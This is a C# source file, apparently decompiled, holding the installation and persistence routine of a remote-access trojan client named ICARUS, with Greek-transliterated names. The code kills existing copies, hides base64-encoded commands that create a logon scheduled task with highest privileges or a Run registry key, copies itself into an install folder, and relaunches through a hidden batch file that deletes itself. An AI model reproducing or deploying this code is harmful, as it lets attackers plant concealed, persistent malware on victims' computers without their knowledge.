using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using Microsoft.Win32;

namespace Peg.ICARUS
{
	internal class Ekinhsh
	{
		public static void egkatasthsh()
		{
			try
			{
				FileInfo fileInfo = new FileInfo(Path.Combine(Environment.ExpandEnvironmentVariables(Settings.Install_Folder), Settings.Install_File));
				string fileName = Process.GetCurrentProcess().MainModule.FileName;
				if (!(fileName != fileInfo.FullName))
				{
					return;
				}
				Process[] processes = Process.GetProcesses();
				foreach (Process process in processes)
				{
					try
					{
						if (process.MainModule.FileName == fileInfo.FullName)
						{
							process.Kill();
						}
					}
					catch
					{
					}
				}
				if (Me8odos.IsAdmin())
				{
					ProcessStartInfo processStartInfo = new ProcessStartInfo();
					processStartInfo.FileName = "cmd";
					processStartInfo.Arguments = Encoding.Default.GetString(Convert.FromBase64String("L2Mgc2NodGFza3MgL2NyZWF0ZSAvZiAvc2Mgb25sb2dvbiAvcmwgaGlnaGVzdCAvdG4g")) + "\"" + Path.GetFileNameWithoutExtension(fileInfo.Name) + "\" /tr '\"" + fileInfo.FullName + "\"' & exit";
					processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					processStartInfo.CreateNoWindow = true;
					Process.Start(processStartInfo);
				}
				else
				{
					using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(Encoding.Default.GetString(Convert.FromBase64String("U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuXA==")), RegistryKeyPermissionCheck.ReadWriteSubTree);
					registryKey.SetValue(Path.GetFileNameWithoutExtension(fileInfo.Name), "\"" + fileInfo.FullName + "\"");
				}
				if (File.Exists(fileInfo.FullName))
				{
					File.Delete(fileInfo.FullName);
					Thread.Sleep(1000);
				}
				FileStream fileStream = new FileStream(fileInfo.FullName, FileMode.CreateNew);
				byte[] array = File.ReadAllBytes(fileName);
				fileStream.Write(array, 0, array.Length);
				Me8odos.ClientOnExit();
				string text = Path.GetTempFileName() + ".bat";
				using (StreamWriter streamWriter = new StreamWriter(text))
				{
					streamWriter.WriteLine("@echo off");
					streamWriter.WriteLine("timeout 3 > NUL");
					streamWriter.WriteLine("START \"\" \"" + fileInfo.FullName + "\"");
					streamWriter.WriteLine("CD " + Path.GetTempPath());
					streamWriter.WriteLine("DEL \"" + Path.GetFileName(text) + "\" /f /q");
				}
				Process.Start(new ProcessStartInfo
				{
					FileName = text,
					CreateNoWindow = true,
					ErrorDialog = false,
					UseShellExecute = false,
					WindowStyle = ProcessWindowStyle.Hidden
				});
				Environment.Exit(0);
			}
			catch (Exception)
			{
			}
		}
	}
}
